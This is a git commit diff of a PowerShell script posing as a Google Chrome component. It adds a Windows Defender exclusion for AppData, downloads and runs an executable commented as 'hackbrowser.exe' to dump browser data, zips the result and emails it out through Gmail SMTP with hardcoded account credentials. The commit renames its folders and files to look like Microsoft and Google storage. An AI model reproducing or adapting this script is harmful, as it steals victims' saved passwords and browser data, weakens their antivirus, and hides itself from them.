1ccb3c53ce87d420ba76fb3a60bb0ac2a5ecf30f
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-05 13:18:19 -0500

    Update googlechromescriptyes.ps1

--- googlechromescriptyes.ps1
+++ googlechromescriptyes.ps1
@@ -1,29 +1,27 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
+mkdir "$env:appdata\Microsoft\microsoftstorage"
+Set-Location "$env:appdata\Microsoft\microsoftstorage"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "hb.exe"
+Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Force
 #Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
+Compress-Archive -Path * -DestinationPath google.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
 $ReportEmail = new-object Net.Mail.MailMessage
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.co', 'ilo36912!');
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('beneafrr@gmail.com', 'Milo36912!');
 $ReportEmail.From = 'beneafrr@gmail.com'
 $ReportEmail.To.Add('beneafrr@gmail.com')
-$ip = Invoke-RestMethod "myexternalip.com/raw"
-$ReportEmail.Subject = "Googlechrome " + $env:USERNAME + "! (" + $ip + ")"
-$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
+$ReportEmail.Subject = "Googlechrome"
 $ReportEmail.Body = 'Opening web.'
 $files=Get-ChildItem 
-$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\microsoftstorage\google.zip")
 $SMTPInfo.Send($ReportEmail)
 $ReportEmail.Dispose()
 $SMTPInfo.Dispose()
